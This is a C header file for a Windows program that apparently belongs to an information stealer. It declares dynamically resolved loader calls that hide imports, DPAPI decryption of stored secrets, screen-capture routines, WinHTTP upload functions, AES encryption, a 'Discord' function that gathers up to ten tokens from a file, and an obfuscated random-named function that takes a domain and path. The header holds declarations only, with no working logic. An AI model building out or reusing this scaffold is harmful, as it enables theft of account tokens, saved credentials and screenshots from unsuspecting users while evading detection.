#ifndef GLOBAL_H
#define GLOBAL_H

#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define OKAY(MSG, ...) printf("\x1b[97m[\x1b[92m+\x1b[97m] " MSG "\n", ##__VA_ARGS__)
#define INFO(MSG, ...) printf("\x1b[97m[\x1b[93m!\x1b[97m] " MSG "\n", ##__VA_ARGS__)
#define WARN(MSG, ...) fprintf(stderr, "\x1b[97m[\x1b[91m-\x1b[97m] " MSG "\n", ##__VA_ARGS__)
#define BCRYPT_INIT_AUTH_MODE_INFO(info) do { (info).dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION; (info).cbSize = sizeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO); (info).pbNonce = NULL; (info).cbNonce = 0; (info).pbAuthData = NULL; (info).cbAuthData = 0; (info).pbTag = NULL; (info).cbTag = 0; (info).pbMacContext = NULL; (info).cbMacContext = 0; (info).cbAAD = 0; (info).cbData = 0; (info).dwFlags = 0; } while (0)

typedef BOOL(WINAPI *CryptStringToBinaryFunc)(LPCSTR, DWORD, DWORD, BYTE *, DWORD *, DWORD *, DWORD *);
typedef BOOL(WINAPI *CryptBinaryToStringFunc)(const BYTE *, DWORD, DWORD, LPSTR, DWORD *);
typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWCH Buffer; } UNICODE_STRING, *PUNICODE_STRING;
typedef struct _ANSI_STRING    { USHORT Length; USHORT MaximumLength; PCHAR Buffer; } ANSI_STRING, *PANSI_STRING;
typedef NTSTATUS (NTAPI* NtLdrLoadDll) (_In_opt_ PWSTR DllPath, _In_opt_ PULONG DllCharacteristics, _In_ PUNICODE_STRING DllName, _Out_ PVOID *DllHandle);
typedef NTSTATUS (NTAPI* NtLdrUnloadDll) (_In_ PVOID DllHandle);
typedef NTSTATUS (NTAPI* NtLdrGetProcedureAddress) (_In_ PVOID DllHandle, _In_opt_ PANSI_STRING ProcedureName, _In_opt_ ULONG ProcedureNumber, _Out_ PVOID *ProcedureAddress);
typedef HBITMAP (WINAPI *PFNCreateCompatibleBitmap)(HDC, int, int);
typedef BOOL(WINAPI *CryptUnprotectDataFunc)(DATA_BLOB *, LPWSTR *, DATA_BLOB *, PVOID, CRYPTPROTECT_PROMPTSTRUCT *, DWORD, DATA_BLOB *);
typedef BOOL (WINAPI *PFNBitBlt)(HDC, int, int, int, int, HDC, int, int, DWORD);
typedef HDC (WINAPI *PFNCreateCompatibleDC)(HDC);
typedef int (WINAPI *PFNGetDeviceCaps)(HDC, int);
typedef HGDIOBJ (WINAPI *PFNSelectObject)(HDC, HGDIOBJ);
typedef BOOL (WINAPI *PFNDeleteDC)(HDC);
typedef BOOL (WINAPI *PFNDeleteObject)(HGDIOBJ);
typedef int (WINAPI *PFNGetObjectA)(HGDIOBJ, int, LPVOID);
typedef BOOL (WINAPI *PFNGetDIBits)(HDC, HBITMAP, UINT, UINT, LPVOID, BITMAPINFO*, UINT);
typedef unsigned char BYTE;
typedef HINTERNET(WINAPI *WinHttpOpenFunc)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET(WINAPI *WinHttpConnectFunc)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET(WINAPI *WinHttpOpenRequestFunc)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL(WINAPI *WinHttpSendRequestFunc)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI *WinHttpReceiveResponseFunc)(HINTERNET, LPVOID);
typedef BOOL(WINAPI *WinHttpCloseHandleFunc)(HINTERNET);
typedef NTSTATUS (WINAPI *BCryptOpenAlgorithmProvider_t)(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
typedef NTSTATUS (WINAPI *BCryptImportKeyPair_t)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE, LPCWSTR, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, ULONG);
typedef NTSTATUS (WINAPI *BCryptSetProperty_t)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
typedef NTSTATUS (WINAPI *BCryptGenerateSymmetricKey_t)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
typedef NTSTATUS (WINAPI *BCryptDecrypt_t)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
typedef NTSTATUS (WINAPI *BCryptEncrypt_t)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
typedef NTSTATUS (WINAPI *BCryptDestroyKey_t)(BCRYPT_KEY_HANDLE);
typedef NTSTATUS (WINAPI *BCryptCloseAlgorithmProvider_t)(BCRYPT_ALG_HANDLE, ULONG);
typedef NTSTATUS (WINAPI *BCryptGenRandom_t)(BCRYPT_ALG_HANDLE hAlgorithm, PUCHAR pbBuffer, ULONG cbBuffer, ULONG dwFlags);
int GetHandleNTAPI(NtLdrLoadDll* LoadLib, NtLdrGetProcedureAddress* GetProcAdd, NtLdrUnloadDll* UnloadLib);
int Discord(const char *FilePath, char StoreTokens[10][100], int *StoreTokensLength);
const char* WEIlnsAXWqfYLHUcHqaREFjqBBGaAY(const wchar_t* domain, const wchar_t* path, const wchar_t* headers);
extern NtLdrLoadDll LoadLib;
extern NtLdrGetProcedureAddress GetProcAdd;
extern NtLdrUnloadDll UnloadLib;



#endif
